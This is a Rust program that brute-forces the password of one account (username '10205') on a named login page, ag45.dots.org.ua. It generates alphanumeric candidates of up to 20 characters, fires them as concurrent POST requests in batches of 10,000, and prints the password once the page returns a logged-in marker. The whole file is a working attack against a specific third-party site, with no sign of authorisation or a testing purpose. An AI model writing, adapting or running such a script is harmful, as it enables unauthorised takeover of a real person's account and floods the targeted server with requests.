use std::time::Duration;

use itertools::Itertools;
use tokio::task::JoinHandle;

async fn password_generator<'a>() -> impl Iterator<Item = String> + 'a {
    let charset: &'a str = "abcdefghijklmnopqrstuvwxyz0123456789";

    (1..=20)
        .flat_map(move |len| {
            charset
                .chars()
                .combinations_with_replacement(len)
                .map(move |combos| (combos, len))
        })
        .flat_map(|(combos, len)| combos.into_iter().permutations(len))
        .dedup()
        .map(|chars| chars.into_iter().collect())
}

async fn sending_requests() {
    let mut tasks: Vec<JoinHandle<Result<(), ()>>> = Vec::new();

    for password in password_generator().await {
        tasks.push(tokio::spawn(async move {
            let fields = [("username", "10205"), ("password", &password)];

            match reqwest::Client::new()
                .post("https://ag45.dots.org.ua/login")
                .form(&fields)
                .send()
                .await
            {
                Ok(resp) => match resp.text().await {
                    Ok(text) => {
                        if text.contains("ТУРНИРЫ") {
                            println!("CORRECT PASSWORD: {}", &password);
                            std::process::exit(1);
                        }

                        println!("OK: {}", &password)
                    }
                    Err(_) => println!("ERROR: {}", &password),
                },
                Err(_) => println!("ERROR: {}", &password),
            }
            Ok(())
        }));

        if tasks.len() % 10000 == 0 {
            tokio::time::sleep(Duration::from_secs(5)).await;
            dbg!("Started {} tasks. Waiting...", tasks.len());
            futures::future::join_all(tasks).await;

            tasks = Vec::new();
        }
    }
}

#[tokio::main]
async fn main() {
    sending_requests().await
}
